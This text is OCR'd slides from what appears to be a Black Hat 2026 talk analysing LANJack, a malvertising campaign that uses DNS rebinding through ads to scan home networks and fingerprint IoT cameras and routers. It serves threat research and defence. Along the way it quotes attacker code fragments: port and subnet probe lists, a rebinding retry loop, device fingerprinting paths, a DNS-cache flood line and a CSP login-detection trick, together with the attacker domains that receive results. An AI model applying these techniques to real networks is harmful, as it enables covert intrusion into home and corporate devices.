---
title: "LANJack Turning Ads into IoT Recon Tools"
speakers: ["Moriya Pedael"]
conference: "Black Hat"
conference_full: "Black Hat USA 2026"
edition: "USA"
year: 2026
source_pdf: "BlackHat_USA_2026_Slides/Moriya Pedael_LANJack Turning Ads into IoT Recon Tools.pdf"
pages: 56
sha256: "dab9cd131880c61b7607d1355b4698ece7824f64627c63c0234d497c935321d0"
text_chars: 16226
ocr_pages: 26
has_ocr: true
redacted_secrets: 0
ocr_confidence: 86.5
ocr_unreliable_blocks: 3
vision_verified_pages_changed: 53
vision_verified_pages: 56
ocr_timeouts: 0
pages_recovered_from_text_layer: 0
companion_files: []
extractor: "pymupdf4llm 1.28.2 + tesseract"
converted_at: "2026-08-12T05:39:53Z"
---
# LANJack Turning Ads into IoT Recon Tools

**Speakers:** Moriya Pedael  
**Conference:** Black Hat USA 2026  
**Source:** `BlackHat_USA_2026_Slides/Moriya Pedael_LANJack Turning Ads into IoT Recon Tools.pdf` (56 pages)


## Slide 1

# LANJack

Turning Ads into IoT Recon Tools

MORIYA PEDAEL

1

## Slide 2

## About Me

MORIYA PEDAEL

BEFORE

AFTER

2

## Slide 3

## About Me

MORIYA PEDAEL

- **2016-2021** Graphic Designer

- **2020-2021** Web Developer

- **2022-Current** Security Researcher at GeoEdge

3

## Slide 4

## Agenda

### BACKGROUND

- Ad Ecosystem
- Malvertising
- DNS Rebinding

### LANJACK

- Discovery
- Attack Flow
- LANJack V3

### TAKEAWAYS

4

## Slide 5

## Ad Ecosystem

### PAST- DIRECT COMMUNICATION

**Advertiser**

**Publisher**

5

## Slide 6

## Ad Ecosystem

### PRESENT- REAL TIME BIDDING

**Advertiser**

**Publisher**

7

## Slide 7

## Ad Ecosystem

### PRESENT- REAL TIME BIDDING

- Executable Code
- Weak CSP & Sandbox Controls
  - Brand Impersonation & Social Engineering
  - Dynamic & Personalized Ads Resist Analysis
    - Complex Supply Chain
    - Third-Party Code Dependencies

**+ Billions of  Ad Every Day**

Billions of Uncontrolled Script Executions in Trusted Environments

8

## Slide 8

## Ad Ecosystem

### PRESENT- REAL TIME BIDDING

MITRE | ATT&CK®

Matrices | Tactics | Techniques | Defenses | CTI | Resources

Search

ATT&CKcon 7.0 is coming October 27-28, 2026. Learn more about ATT&CKcon 7.0 and submi

TECHNIQUES

- Acquire Infrastructure
  - Domains
  - DNS Server
  - Virtual Private Server
  - Server
  - Botnet
  - Web Services
  - Serverless

Home > Techniques > Enterprise > Acquire Infrastructure > Malvertising

**Acquire Infrastructure: Malvertising**

Other sub-techniques of Acquire Infrastructure (8)

Adversaries may purchase online advertisements that can be abused to distribute malware to victims. Ads can be purchased to plant as well as favorably position artifacts in specific locations online, such as prominently placed within search engine results. These ads may make it more difficult for users to distinguish between actual search results and advertisements.[1] Purchased ads may also target specific audiences using the advertising network's capabilities, potentially further taking advantage of the trust inherently given to search engines and popular

9

## Slide 9

## Malvertising

### PRESENT

McAfee | SiteAdvisor

Scanning your device

100%

Scanned 255149 files

| Results Summary | |
| --- | --- |
| [+] Total items scanned: | 255149 |
| [+] Total security risks detected: | 5 |
| [+] Total security risks resolved: | 0 |
| Total security risks requiring attention: | 5 |

Threat Detected!
Trojan.Fakealert.356

High Risk

Origin
Not available

Activity
Threat actions performed: 1

Start here

Fast & Secure

Enjoy apps on every device

Sie haben die 15,33-milliardste Suche durchgeführt!

You have found:

171 junk files found

3 GB memory can be freed up

UPDATE NOW

FREE GIFT BOX
Available Now!

Have you received a Free Gift Box before?

Yes

No

STOP ADS AND POPUP NOW

Stop Ads est une extension Chrome gratuite qui bloque les publicités pop-up sur les sites de streaming et de téléchargement.

En cliquant sur le bouton Accepter et Continuer, vous acceptez notre Politique de confidentialité et serez redirigé vers le Chrome Web Store pour installer cette extension.

Available in the Chrome Web Store

Cancel

Accepter et Continuer

11

## Slide 10

## DNS Rebinding

### HOW IT WORKS

1) http://malicious.com

Attacker Server
1.2.3.4

Malicious DNS

2) What IP of malicious.com ?

3) Real Public IP + Short Time to Live
Example: 1.2.3.4,  TTL: 0

4) http://malicious.com

5) Malicious code

</> Get Resource
from './index.html'  </>
TTL of malicious.com expired

12

## Slide 11

Attacker Server
1.2.3.4

Malicious DNS

3) Real Public IP + Short Time to Live
Example: 1.2.3.4,  TTL: 0

4) http://malicious.com

5) Malicious code

</> Get Resource
from './index.html'  </>
TTL of malicious.com expired

6) What IP of malicious.com ?

7) Private Local IP
Example: 192.168.1.50

Origin: malicious.com    IP: 1.2.3.4

Origin: malicious.com
IP: 192.168.1.50

13

## Slide 12

## DNS Rebinding

### RELEVANT HISTORY

- **1996** DNS Rebinding via Java JVM

- **2007** Ad-Based DNS Rebinding Plugins PoC (Flash, Java)

- **2018** DNS Rebind Toolkit

- **2019** Singularity DNS Rebinding Framework

Protecting Browsers from DNS Rebinding Attacks

Collin Jackson, Stanford University, collinj@cs.stanford.edu

Adam Barth, Stanford University, abarth@cs.stanford.edu

Andrew Bortz, Stanford University, abortz@cs.stanford.edu

Weidong Shao, Stanford University, wshao@cs.stanford.edu

Dan Boneh, Stanford University, dabo@cs.stanford.edu

ABSTRACT

Attacking Private Networks from the Internet with DNS Rebinding

Brannon Dorsey  Follow  20 min read · Jun 19, 2018

TL;DR Following the wrong link could allow remote attackers to control your WiFi router, Google Home, Roku, Sonos speakers, home thermostats and more.

Black Hat USA 2010: How to Hack Millions of Routers 1/4

Christiaan008

BG - State of DNS Rebinding - Attack & Prevention Techniques and the Singularity of Origin - Gerald

BSidesLV
5.07K subscribers

14

## Slide 13

## LANJack

### SPECIALITY

- First known large-scale DNS Rebinding Campaign

- Delivered through ads

- Real browser-based attack

- No malware or user interaction

- Targeted internal services & IoT devices

tp-link | LINKSYS | HIKVISION | dahua TECHNOLOGY | UNV Uniview Technologies | hp

15

## Slide 14

## LANJack

### DISCOVERY

Malicious AD

**http**://**performance-metrics**.net/**ipScanner**2.html?x=79292830-1778513561-702-1-121-1705-20-cEj9G-2962.5ynkt7iyzb8wh17munwfi-10053-529475-52312853&ifa=805ff036-adbe-4fda-a9a1-0187b90591ed

16

## Slide 15

## LANJack

### DISCOVERY

**http**://**performance-metrics**.net/**ipScanner**2.html?x=79292830......

KAYZEN

EQUATIV

Magnite

ADVIEW

BIDSWITCH

onetag SMART CURATION

PubMatic

partage un Coca-Cola

17

## Slide 16

## LANJack

### DISCOVERY

**Cloaked Response: Ignored Users**

| Name | Status | Domain |
| --- | --- | --- |
| load.js?x=331857147-1772979237-501-1-1... | 200 | performance-metrics.net |
| coca-1536x439.jpg | 200 | burkina24.com |

**Cloaked Response: Targeted Users**

| Name | Met... | Status | Domain |
| --- | --- | --- | --- |
| bla_iter3.jpg | GET | (canceled) | 10.0.0.1 |
| bla_iter3.jpg | GET | (failed) net::ERR... | 192.168.1.... |
| bla_iter3.jpg | GET | (canceled) | 192.168.88.1 |
| bla_iter3.jpg | GET | (canceled) | 192.168.10... |
| bla_iter3.jpg | GET | (canceled) | 10.100.102.1 |
| bla_iter3.jpg | GET | (canceled) | 10.0.0.138 |
| bla_iter3.jpg | GET | (canceled) | 10.219.3.1 |
| bla_iter3.jpg | GET | (canceled) | 172.16.10.1 |
| bla_iter3.jpg | GET | (canceled) | 192.168.14.1 |
| bla_iter3.jpg | GET | (canceled) | 10.10.140.1 |

4417 requests | 0 B transferred | 0 B resources

18

## Slide 17

## LANJack

### DISCOVERY

**Cloaked Response: Ignored Users**

| Name | Status | Domain |
| --- | --- | --- |
| load.js?x=331857147-1772979237-501-1-1... | 200 | performance-metrics.net |
| coca-1536x439.jpg | 200 | burkina24.com |

**Cloaked Response: Targeted Users**

| Url | Method | Status |
| --- | --- | --- |
| http://811dab5c-8c8e-49ab-bb1c-f50ca9e017ad.vf-globallab.com:83/CamScanner2.html?x... | GET | 403 |
| http://919fc57f-fbbb-4b7d-9a67-5a24ff078707.vf-globallab.com:85/CamScanner2.html?x=... | GET | 403 |
| http://9e7df682-ede3-4451-a727-38bb26127ecd.vf-globallab.com:83/CamScanner2.html?x... | GET | 403 |
| http://a0f0fd99-74a8-445b-9b0b-045acda6865b.vf-globallab.com:8000/CamScanner2.ht... | GET | 200 |
| http://a41ac988-2305-4e11-8cb3-eb6f4eadcb0a.vf-globallab.com:8010/CamScanner2.html... | GET | UNKN... |
| http://a56a298c-4a40-4203-9362-5cabd83a929b.vf-globallab.com/CamScanner2.html?x=... | GET | 200 |

| Name | Method | Status | Domain |
| --- | --- | --- | --- |
| k33p?x=79292830-1778513... | POST | 200 | 54.209.207.15 |
| k33p?x=79292830-1778513... | POST | 200 | 54.209.207.15 |
| k33p?x=x=79292830-17785... | POST | 200 | performance-metrics.net |

19

## Slide 18

## LANJack

### DISCOVERY

**performance-metrics.net:**

| | | |
| --- | --- | --- |
| 208.91.197.132 | British Virgin Islands | CONFLUENCE-NETWORK-INC |
| 65.125.27.10 | Chambers - United States | CENTURYLINK-US-LEGACY-QWEST |

| | | |
| --- | --- | --- |
| 54.209.207.15 | Ashburn - United States | AMAZON-AES |

**vf-globallab.com:**

Google

"vf-globallab.com"

Proximus
http://business.proximus.be › VMC_Manual_9_EN  PDF

Vodafone Mobile Connect IT Administrator's Guide

... <ReportingSettings>. <Id>d4981b40-28d6-4de4-b11e-d7db023cb693</Id>. <Url>http://data.vf-globallab.com</Url>. </ReportingSettings>. </MobileConnectProfile>  Read more

/data.vf-globallab.com</

20

## Slide 19

## LANJack

### DISCOVERY

**burkina24.com:**

https://burkina24.com/wp-content/uploads/2025/06/coca-1536x439.jpg

Burkina24
L'actualité du Burkina 24h/24

ACCUEIL  BURKINA  MONDE  POLITIQUE  ÉCONOMIE  OPINION  SPORT  TECH  CULTURE  LIVE

Communiqué | « Partage un Coca-Cola » est de retour ! La magie de retrouver ton prénom sur la bouteille emblématique fait son grand retour

partage un Coca-Cola

**Target:**

98%
Mexico

21

## Slide 20

## LANJack CAMPAIGN EVOLUTION

**May 2025**
LAN Recon
Main Version

**November 2025**
RTSP Prob
Test Version
One Month

**December 2025**
CSP Abuse
Test Version
One Week

**May 2026**
Gesture Check
Test Version
One Week

22

## Slide 21

## LANJack CAMPAIGN FLOW

BREAKING NEWS
Malicious AD

**Special:**
DNS Cache Pollution &
Forensic Evasion

**</> AD IFRAME </>**

**ipScanner IFrame**

IFRAME: http://${uuldv4()}.vf-globallab.com:${port}/CamScanner.html

FETCH: http://10.0.0.254/bla_iter1.jpg
...
FETCH: http://192.168.1.1/bla_iter1.jpg
credentials: 'omit'
AbortSignal: 1 sec

FETCH: http://10.0.0.253:80/favicon.ico
...
http://10.0.0.253:8888/favicon.ico
credentials: 'omit'
mode: 'no-cors'
cache: 'no-store
AbortSignal: 3 sec

**CamScanner IFrame**

IMG: http://${int32_IP}.${uuldv4()}.control.vf-aloballab.com/...
↓ IFrame Resolve to Internal IP ↓
FETCH: /ISAPI/Security/userCheck
/upnpdevicedesc.xml
/cgi-bin/main-cgi?json={{%22cmd%22:%20116}}

1. Attack Triggering
2. DNS Cache Priming
3. LAN Reconnaissance
4. DNS Rebinding
5. IoT Fingerprinting & Exploitation preparation

23

## Slide 22

## LANJack ATTACK TRIGGERING

**Challenge :** Geographic Targeting Without Exposure **Solution :** Cloaking

| Name | Status | Domain |
| --- | --- | --- |
| load.js?x=331857147-1772979237-501-1-1... | 200 | performance-metrics.net |
| coca-1536x439.jpg | 200 | burkina24.com |

- HTTP accessibility checks
- Log Results
- Loads ipScanner.html over HTTP
   - Hidden Iframe
   - Forced Redirect

24

## Slide 23

## LANJack ATTACK TRIGGERING

**Why Two Methods?**

Load.js File
- Top Redirect - 5 sec
- Iframe Render

25

## Slide 24

## LANJack ATTACK TRIGGERING

**Why Two Methods?**

**Challenge :** Execute Without User Awareness **Solution : Hidden Iframe Rendering**

Load.js File
- Top Redirect - 5 sec
- Iframe Render
  - Non-Safe Context (HTTP)
    - Init Attack

26

## Slide 25

## LANJack ATTACK TRIGGERING

**Why Two Methods?**

**Challenge :** Execute Within a Secure Context

**Solution :** Forced Navigation to Malicious Page

Load.js File
- Top Redirect - 5 sec
- Iframe Render
  - Safe Context (HTTPS)
    - Block Iframe
  - Non-Safe Context (HTTP)
    - Init Attack

```
This page is in Quirks Mode. Page layout may be impacted. For Standards Mode use "<!DOCTYPE html>". [Learn More]
← undefined
Blocked loading mixed active content "http://performance-metrics.net/k33p?x=x=378065444-1773625811-238-3-31-1716-7-XLF7G-f2823d8b-ac89-393b-89d3-b3d5ea2a1a80-10031-529475-52284611&ifa=c33ff565-0574-477a-8b3d-c1099e819e6c" [Learn More]
Blocked loading mixed active content "http://performance-metrics.net/ipScanner2.html?x=378065444-1773625811-238-3-31-1716-7-XLF7G-f2823d8b-ac89-393b-89d3-b3d5ea2a1a80-10031-529475-52284611&ifa=c33ff565-0574-477a-8b3d-c1099e819e6c" [Learn More]
Uncaught (in promise) TypeError: NetworkError when attempting to fetch resource.
    <anonymous> ...://performance-metrics.net/load.js?x=378065444-1773625811-238-3-31-1716-7-XLF7G-f2823d8b-ac89-393b-89d3-b3d5ea2a1a80-10031-529475-52284611&ifa=c33ff565-0574-477a-8b3d-c1099e81
```

**Mixed Content:** a browser security mechanism that blocks insecure resources (HTTP) from being loaded inside secure pages (HTTPS).

27

## Slide 26

## LANJack ATTACK TRIGGERING

**Why Two Methods?**

**Challenge :** Execute Within a Secure Context

**Solution :** Forced Navigation to Malicious Page

Load.js File
- Top Redirect - 5 sec
  - Inside Unsafe Frame
    - Redirect & Init Attack
- Iframe Render
  - Safe Context (HTTPS)
    - Block Iframe
  - Non-Safe Context (HTTP)
    - Init Attack

28

## Slide 27

## LANJack ATTACK TRIGGERING

**Why Two Methods?**

**Challenge :** Execute Within a Secure Context

**Solution :** Forced Navigation to Malicious Page

Load.js File
- Top Redirect - 5 sec
  - Inside Restricted Frame
    - Block Redirect
  - Inside Unsafe Frame
    - Redirect & Init Attack
- Iframe Render
  - Safe Context (HTTPS)
    - Block Iframe
  - Non-Safe Context (HTTP)
    - Init Attack

29

## Slide 28

## LANJack DNS CACHE PRIMING

**Challenge :** DNS Pinning **Solution :** Cache Priming

Browser | Malicious DNS

1) :{targeted_port}/CamScanner
Taken from the cache

2) Rebinding Code
Get root page
{uuidv4}.vf-globallab.com
TTL expired

3) What IP of {uuidv4}.vf-globallab.com ?

4) Private Local IP

30

## Slide 29

## LANJack DNS CACHE PRIMING

**Challenge :** DNS Pinning **Solution :** Cache Priming

- Unique UUID subdomains
- Common ports for IoT devices

```
const preloadPorts = ['80','81','8080','82','88','83',
'8001','84','85','90','8888','9000','8090','8000',
'8010','9090','1080'];
```

```
`http://${uuidv4()}.vf-globallab.com:${port}/CamScanner2.html?x=${window.id}`)
```

- Loading under Hidden Iframes
- Round-robin approach
- Cleanup

32

## Slide 30

## LANJack LAN RECONNAISSANCE

**Challenge :** Identify Active Local Devices Despite Browser Restrictions

**Solution :** Exploit LNA Timing Exposure (Chrome v142+ & Firefox v151+)

example.com wants to
Look for and connect to any device on your local network
Block   Allow

Allow permission.site to access apps and services on devices connected to your local network?
Learn more
[ ] Remember my choice for this site
Block   Allow

**Local Network Access (LNA):** User permission required for local network access.

33

## Slide 31

## LANJack LAN RECONNAISSANCE

**Challenge :** Identify Active Local Devices Despite Browser Restrictions **Solution :** Exploit LNA Timing Exposure (Chrome v142+ & Firefox v151+)

**Chrome | Opened Issue**

WICG / local-network-access
LNA check after connection establishment allows for potential ID sharing #103
Open — TimVlummens opened on Feb 26

**Firefox | Opened Issue**

Bugzilla
Open — Bug 2022790 — Opened 2 months ago — Updated 1 month ago
Consider showing LNA prompt before establishing TCP connection (ETP strict)
Product: Core — Component: Networking — Type: enhancement — Priority: P2 — Severity: S3

34

## Slide 32

## LANJack LAN RECONNAISSANCE

**Challenge :** Identify Active Local Devices Despite Browser Restrictions **Solution :** Exploit LNA Timing Exposure (Chrome v142+ & Firefox v151+)

**Step 1: Identify the network gateway**

- Probe common local IP addresses defined in RFC 1918

```
subnets=["10.0.0.254", "192.168.1.1", "192.168.0.1","192.1...
"192.168.6.1","192.168.200.1","192.168.140.1","172.16.0.1"...
"10.118.15.1","172.25.20.1","10.1.1.1","172.19.0.1","192.1...
```

- Requests for a non-existent resource

```
const url = "http://"+subnets[i]+"/bla_iter"+iter+".jpg"
```

- Abort after 1 second

Fastest connection time → the Gateway

35

## Slide 33

## LANJack LAN RECONNAISSANCE

**Challenge :** Identify Active Local Devices Despite Browser Restrictions **Solution :** Exploit LNA Timing Exposure (Chrome v142+ & Firefox v151+)

**Step 2: Discover active internal devices**

- All Hosts in the /24 Subnet

- Priority Scan: x.x.x.[1–20] & x.x.x.[100–120]

- Reuse the Same 17 Target Ports

- Requests for favicon.ico

- Abort after 3 seconds

Any response → Host reachable Failure or timeout → Host unreachable

36

## Slide 34

## LANJack LAN RECONNAISSANCE

**Challenge :** Identify Active Local Devices Despite Browser Restrictions **Solution :** Exploit LNA Timing Exposure (Chrome v142+ & Firefox v151+)

##### **Step 2: Discover active internal devices**

[ ] Big request rows
[x] Overview
20,000 ms   40,000 ms   60,000 ms   80,000 ms   100,000 ms

| Name | Method | Status | Domain |
| --- | --- | --- | --- |
| favicon.ico | GET | 404 | 192.168.1.1 |
| favicon.ico | GET | 404 | 192.168.1.1 |
| favicon.ico | GET | (failed) net::ERR_ADDRESS_UNR... | 192.168.1.92 |
| favicon.ico | GET | (failed) net::ERR_ADDRESS_UNR... | 192.168.1.91 |
| favicon.ico | GET | (failed) net::ERR_ADDRESS_UNR... | 192.168.1.90 |
| favicon.ico | GET | (failed) net::ERR_ADDRESS_UNR... | 192.168.1.89 |

37

## Slide 35

## LANJack DNS REBINDING

**Challenge :** Same-Origin Policy Blocks Cross-Origin Responses **Solution :** DNS Rebinding

Browser | Malicious DNS

1) :{targeted_port}/CamScanner
Taken from the cache

2) Rebinding Code
Get root page
{uuidv4}.vf-globallab.com
TTL expired

3) What IP of {uuidv4}.vf-globallab.com ?

4) Private Local IP

After

38

## Slide 36

## LANJack DNS REBINDING

##### **Challenge :** Same-Origin Policy Blocks Cross-Origin Responses

##### **Solution :** DNS Rebinding

Browser | Malicious DNS

Attacker Server
control.vf-globallab.com

1) :{targeted_port}/CamScanner
Taken from the cache

2) Rebinding Code
IMG: Encoded Victim Local IP

3) Get root page
{uuidv4}.vf-globallab.com
TTL expired
What IP of {uuidv4}.vf-globallab.com ?

4) Private Victim Local IP

After

39

## Slide 37

## LANJack DNS REBINDING

**DNS Resolution swap to Internal IP:**

Before:

```
▾ Answers
  ▸ 85d67bd3-33ff-48c3-a665-8c0d92e1927e.vf-globallab.com: type A, class IN, addr 54.209.207.15
      Name: 85d67bd3-33ff-48c3-a665-8c0d92e1927e.vf-globallab.com
      Type: A (1) (Host Address)
      Class: IN (0x0001)
      Time to live: 5 (5 seconds)
      Data length: 4
      Address: 54.209.207.15
```

After:

```
▾ Answers
  ▾ 85d67bd3-33ff-48c3-a665-8c0d92e1927e.vf-globallab.com: type A, class IN, addr 192.168.1.105
      Name: 85d67bd3-33ff-48c3-a665-8c0d92e1927e.vf-globallab.com
      Type: A (Host Address) (1)
      Class: IN (0x0001)
      Time to live: 5 (5 seconds)
      Data length: 4
      Address: 192.168.1.105
```

40

## Slide 38

## LANJack DNS REBINDING

##### **Challenge :** DNS Pinning

**Solution :** Up to 100 Rebinding Attempts (1s Interval)

Malicious DNS

2) Rebinding Code

3) Get root page
{uuidv4}.vf-globallab.com
TTL expired
Up to 100 attempts

What IP of {uuidv4}.vf-globallab.com ?

4) Private Victim Local IP

```
async function fetchFrame() {

  if (retryFrameCounter > 100) {
    Homey("CamScan: Stop Trying After " + retryFrameCounter + " Attempts - " + location.host)
    return

const json = await response.text().then((responseText) => {
  if (responseText.indexOf('funads3212') > -1) {
    setTimeout(fetchFrame, 1 * 1000)
    return
  }
```

After

41

## Slide 39

LANJack IOT FINGERPRINTING & EXPLOITATION PREPARATION

**Challenge :** Identify Device-Specific Information

**Solution :** Hash-Based Identification & Targeted Reconnaissance

</> AD IFRAME </>

ipScanner IFrame

IFRAME: http://${uuldv4()}.vf-globallab.com:${port}/CamScanner.html

FETCH: http://10.0.0.254/bla_iter1.jpg
...
FETCH: http://192.168.1.1/bla_iter1.jpg
credentials: 'omit'
AbortSignal: 1 sec

FETCH: http://10.0.0.253:80/favicon.ico
...
http://10.0.0.253:8888/favicon.ico
credentials: 'omit'
mode: 'no-cors'
cache: 'no-store
AbortSignal: 3 sec

CamScanner IFrame

IMG: http://${int32_IP}.${uuldv4()}.control.vf-aloballab.com/...

↓ IFrame Resolve to Internal IP ↓

FETCH: /ISAPI/Security/userCheck
/upnpdevicedesc.xml
/cgi-bin/main-cgi?json={{%22cmd%22:%20116}}

1. Attack Triggering
2. DNS Cache Priming
3. LAN Reconnaissance
4. DNS Rebinding
5. IoT Fingerprinting & Exploitation preparation

Attacker Server — Browser — The IoT Device

1. /CamScanner
IoT Root Page
Log: Root Page
2. /favicon.ico
Favicon
Log: Hashed Favicon
3. Compare Hashed Favicon & Root Page against Hardcoded Tables
4. Vendor specific requests
Log: Device information
5. Additional Fingerprinting & Athentication Requests

42

## Slide 40

LANJack IOT FINGERPRINTING & EXPLOITATION PREPARATION

**Challenge :** Identify Device-Specific Information

**Solution :** Hash-Based Identification & Targeted Reconnaissance

43

## Slide 41

LANJack IOT FINGERPRINTING & EXPLOITATION PREPARATION

**Challenge :** Identify Device-Specific Information

**Solution :** Hash-Based Identification & Targeted Reconnaissance

```text
"ID":1,
"apName": "W125AP",
"text": "000",
"software_vertion":"1…
"macAddr": …
"ipAddr": …
"currentststus": 0,
"clientNum": "0/12",
"clientNum_5g": "0/44…
"rfNum": 1,
"power": 12,
"power_5g": 23,
"real_channel": 0,
"real_channel_5g": 14…
```

43

## Slide 42

LANJack IOT FINGERPRINTING & EXPLOITATION PREPARATION

**Challenge :** Identify Device-Specific Information

**Solution :** Hash-Based Identification & Targeted Reconnaissance

hikvision-keygen

Key generator to reset a Hikvision IP camera's admin password

"/upnpdevicedesc.xml",

This is a script to exploit older Hikvision devices' weak password reset key generation.

44

## Slide 43

LANJack BONUS PHASE

DNS Cache Pollution & Forensic Evasion

**Challenge :** Forensic Evasion

**Solution :** Browser Noise Generation

- 5,000+ Random Subdomains
- Broken Image Flood
- DNS Cache Flooding

```js
='<img src="'+'https://'+parseInt(Math.random()*100000)+"gdf."+'stackexchange.com'+'/img.jpg'+'">'
```

46

## Slide 44

LANJack THIRD VARIANT

May 2025
LAN Recon
Main Version

November 2025
RTSP Prob
Test Version
One Month

December 2025
CSP Abuse
Test Version
One Week

May 2026
Gesture Check
Test Version
One Week

47

## Slide 45

LANJack THIRD VARIANT

</> AD IFRAME </>

i IFrame
f1: Google
f2
f3: facebook

1. Attack Triggering
2. Controlled IFrame
3. CSP Abused

```html
<!doctype html>
<html>
  <head><meta charset="utf-8"><title>/i.html</title></head>
  <body>
    <h3>/i.html</h3>
    <iframe src="/f1?
x=243737984-1766450064-333-3-22-719-11-eDlZb-711283b3-e23d-3848-95c7-3f010772a011-10031-529475-52195013&
carrier=izzix=" style="width:1px;height:1px;border:1px solid #ccc;" referrerpolicy="no-referrer"></iframe>
    <iframe src="/f2?
x=243737984-1766450064-333-3-22-719-11-eDlZb-711283b3-e23d-3848-95c7-3f010772a011-10031-529475-52195013&
carrier=izzix=" style="width:1px;height:1px;border:1px solid #ccc;" referrerpolicy="no-referrer"></iframe>
    <iframe src="/f3?
x=243737984-1766450064-333-3-22-719-11-eDlZb-711283b3-e23d-3848-95c7-3f010772a011-10031-529475-52195013&
carrier=izzix=" style="width:1px;height:1px;border:1px solid #ccc;" referrerpolicy="no-referrer"></iframe>
  </body>
</html>
```

48

## Slide 46

LANJack THIRD VARIANT

Google Account
Activity controls

</> AD IFRAME </>

i IFrame
f1: Google
f2
f3: facebook

Family Centre
For Meta technologies

49

## Slide 47

LANJack THIRD VARIANT

</> AD IFRAME </>

i IFrame
f1: Google
f2
f3: facebook

1. Attack Triggering
2. Controlled IFrame
3. CSP Abused

```text
Framing 'https://myactivity.google.com/' violates the following Content Security Policy directive: "default-src 'self' https://accounts.google.com https://*.gstatic.com https://ogs.google.com https://lh3.google.com https://www.google-analytics.com https://play.google.com https://accounts.youtube.com https://www.google.com". The request has been blocked. Note that 'frame-src' was not explicitly set, so 'default-src' is used as a fallback.    f1?x=243737984-17664..1-10031-529475-5..:5

Framing 'https://www.facebook.com/' violates the following Content Security Policy directive: "default-src 'self' https://familycenter.facebook.com https://static.xx.fbcdn.net wss://gateway.facebook.com". The request has been blocked. Note that 'frame-src' was not explicitly set, so 'default-src' is used as a fallback.    f3?x=243737984-17664..1-10031-529475-5..:5
```

50

## Slide 48

LANJack THIRD VARIANT

| Name | Status | Domain | Remote address | Type | Initiator |
|---|---|---|---|---|---|
| r1?x=285180446-1766546665-651-1-79-190… | 200 | adsrevenuestream.duckdn… | 18.233.217.158:443 | text/html | https://adsrevenuestre… |
| r3?x=285180446-1766546665-651-1-79-190… | 200 | adsrevenuestream.duckdn… | 18.233.217.158:443 | text/html | https://adsrevenuestre… |

Request Payload    View source

```text
{csp-report: {,…}}
  csp-report: {,…}
    blocked-uri: "https://myactivity.google.com"
    disposition: "enforce"
    document-uri: "https://adsrevenuestream.duckdns.org/f1?x=285180446-1766546665-651-1-79-1909-15-qxdEq-9e61d95f-5da4-3dde-a67b-19047fa22c…
    effective-directive: "frame-src"
    line-number: 5
    original-policy: "default-src 'self' https://accounts.google.com https://*.gstatic.com https://ogs.google.com https://lh3.google.com ht…
    referrer: ""
    script-sample: ""
    source-file: "https://adsrevenuestream.duckdns.org/f1"
    status-code: 200
    violated-directive: "frame-src"
```

51

## Slide 49

LANJack THIRD VARIANT

f1: Google

Request URL: https://adsrevenuestream.duckdns.org/f1?x=285180446-1766546665-651-1-79-1909-15-qxdEq-9e61d95f-5da4-3dde-a67b-19047fa22cdd-1
31-529475-52195013&carrier=telmexx=a26e8024-d5cb-3863-b36d-4c5248c74f79
Request Method: GET
Status Code: 200 OK
Remote Address: 18.233.217.158:443

Response headers
Content-Security-Policy

report-uri /r1?x=285180446-1766546665-

52

## Slide 50

LANJack THIRD VARIANT

f1: Google

Request URL: https://adsrevenuestream.duckdns.org/f1?x=285180446-1766546665-651-1-79-1909-15-qxdEq-9e61d95f-5da4-3dde-a67b-19047fa22cdd-1
31-529475-52195013&carrier=telmexx=a26e8024-d5cb-3863-b36d-4c5248c74f79
Request Method: GET
Status Code: 200 OK
Remote Address: 18.233.217.158:443

Response headers
Content-Security-Policy: default-src 'self' https://accounts.google.com https://*.gstatic.com https://ogs.google.com https://lh3.google.com https://www.google-analytics.com https://play.google.com https://accounts.youtube.com https://www.google.com; report-uri /r1?x=285180446-1766546665-

53

## Slide 51

LANJack THIRD VARIANT

| | CSP Allowed List | CSP Violation Report |
|---|---|---|
| Google | accounts.google.com<br>*.gstatic.com<br>ogs.google.com<br>lh3.google.com<br>www.google-analytics.com<br>play.google.com<br>accounts.youtube.com<br>www.google.com | myactivity.google.com |
| Facebook | familycenter.facebook.com<br>static.xx.fbcdn.net<br>gateway.facebook.com | www.facebook.com/login |

54

## Slide 52

LANJack THIRD VARIANT

Google
https://accounts.google.com/ServiceLogin?...

myactivity.google.com/?continue=...
accounts.google.com/InteractiveLogin?...
accounts.google.com/v3/signin/identifier?...

f1: Google

| | CSP Allowed List (No Report) | CSP Violation Report (Report) |
|---|---|---|
| Google | accounts.google.com | myactivity.google.com |
| User | Not Connected | Connected |

55

## Slide 53

LANJack THIRD VARIANT

facebook
https://familycenter.facebook.com/dashboard/?...

familycenter.facebook.com/dashboard/?..
www.facebook.com/login.php?...

f3: facebook

| | CSP Allowed List (No Report) | CSP Violation Report (Report) |
|---|---|---|
| Facebook | familycenter.facebook.com | www.facebook.com/login |
| User | Connected | Not Connected |

56

## Slide 54

LANJack THIRD VARIANT

f1: Google
f2
f3: facebook

| | CONNECTED | NOT CONNECTED |
|---|---|---|
| GOOGLE | Report | No Report |
| FACEBOOK | No Report | Report |

57

## Slide 55

LANJack WHY IT WORKED

- Trust in Ads & Third-Party Code

- Inconsistent Security Controls

- Targeted Content Cloaking

- DNS Cache Priming

- LNA Timing Side Channel

- DNS Rebinding

- Weak IoT Interfaces

- CSP Side Channel

58

## Slide 56

LANJack TAKEAWAYS

Remember This:

- Ads can perform browser-based attacks
- Browser access => attacker access
- Secure your IoT devices

**Moriya Pedael**

59

